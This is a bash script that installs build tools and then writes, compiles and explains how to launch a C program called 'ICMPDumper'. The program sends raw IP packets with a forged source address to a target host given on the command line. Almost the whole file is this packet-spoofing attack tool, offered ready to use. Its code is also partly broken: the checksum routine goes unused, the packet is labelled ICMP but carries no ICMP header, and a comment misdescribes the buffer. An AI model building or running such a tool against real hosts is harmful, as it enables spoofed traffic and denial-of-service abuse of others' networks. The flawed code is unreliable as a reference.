#!/bin/bash

# Set variables
SRC_FILE="icmpdumper.c"
OUTPUT_BINARY="icmpdumper"
GCC="gcc"

# Update and install necessary dependencies
echo "Updating package list and installing required packages..."
sudo apt update
sudo apt install -y build-essential net-tools

# Create the C source file
echo "Creating the source C file ($SRC_FILE)..."
cat > $SRC_FILE <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

struct icmp_hdr {
    struct iphdr iph;
    char text[16];  // Ensure proper buffer size for the text
} encaps;

int in_cksum(int *ptr, int nbytes) {
    long sum;
    u_short oddbyte, answer;
    sum = 0;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

struct sockaddr_in sock_open(int socket, char *address, int prt) {
    struct hostent *host;
    struct sockaddr_in sin;

    if ((host = gethostbyname(address)) == NULL) {
        perror("Unable to get host name");
        exit(-1);
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;  // Use AF_INET instead of PF_INET
    sin.sin_port = htons(prt); // Port is typically unused in raw sockets, can be set to any value
    memcpy(&sin.sin_addr, host->h_addr, host->h_length);

    return sin;
}

int main(int argc, char **argv) {
    int sock, on;
    struct sockaddr_in addrs;
    printf("\t\tICMPDumper \n\t\t\tBy SleepTheGod\n");

    if (argc < 3) {
        printf("Usage: %s <ip_spoof> <dest_ip>\n", argv[0]);
        exit(-1);
    }

    // Setup encapsulation text (example for a fixed message)
    memcpy(encaps.text, "BLADI TZO TOPOYO", 16); // Properly initializing text array with null-termination

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(-1);
    }

    on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        perror("Can't set IP_HDRINCL option on socket");
        exit(-1);
    }

    fflush(stdout);

    addrs = sock_open(sock, argv[2], 0);  // Raw sockets don't need a specific port

    // Setting up the IP header
    memset(&encaps.iph, 0, sizeof(struct iphdr));
    encaps.iph.version = 4;  // IP Version 4
    encaps.iph.ihl = 5;      // IP Header Length (5 words, 20 bytes)
    encaps.iph.frag_off = 0; // No fragment offset
    encaps.iph.id = htons(0x001);
    encaps.iph.protocol = IPPROTO_ICMP;  // Assuming ICMP for this example
    encaps.iph.ttl = 64;     // Time to Live
    encaps.iph.tot_len = htons(sizeof(struct iphdr) + sizeof(encaps.text)); // Total length of the packet
    encaps.iph.daddr = addrs.sin_addr.s_addr;
    encaps.iph.saddr = inet_addr(argv[1]);

    printf("\tDuMpInG %s ---> %s \n", argv[1], argv[2]);

    // Send the crafted packet
    if (sendto(sock, &encaps, sizeof(encaps), 0, (struct sockaddr *)&addrs, sizeof(struct sockaddr)) == -1) {
        if (errno != ENOBUFS) {
            perror("Error sending packet");
        }
    }

    fflush(stdout);
    close(sock);

    return 0;
}
EOF

# Compile the C source file
echo "Compiling the C source code..."
$GCC -o $OUTPUT_BINARY $SRC_FILE

# Check if the compilation was successful
if [ $? -eq 0 ]; then
    echo "Compilation successful! Executable: $OUTPUT_BINARY"
else
    echo "Compilation failed!"
    exit 1
fi

# Run the compiled binary with arguments (you need to provide them when running)
echo "To run the program, use: sudo ./$OUTPUT_BINARY <ip_spoof> <dest_ip>"
